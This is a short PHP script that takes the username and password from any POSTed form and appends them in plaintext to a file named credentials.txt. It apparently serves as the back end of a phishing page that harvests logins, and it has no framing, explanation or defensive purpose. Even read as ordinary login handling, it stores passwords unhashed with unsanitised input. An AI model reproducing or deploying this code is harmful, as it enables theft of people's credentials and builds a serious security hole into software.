<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  // Save the username and password to a file
  $file = fopen("credentials.txt", "a"); // Open the file in append mode
  fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
  fclose($file);
}
?>
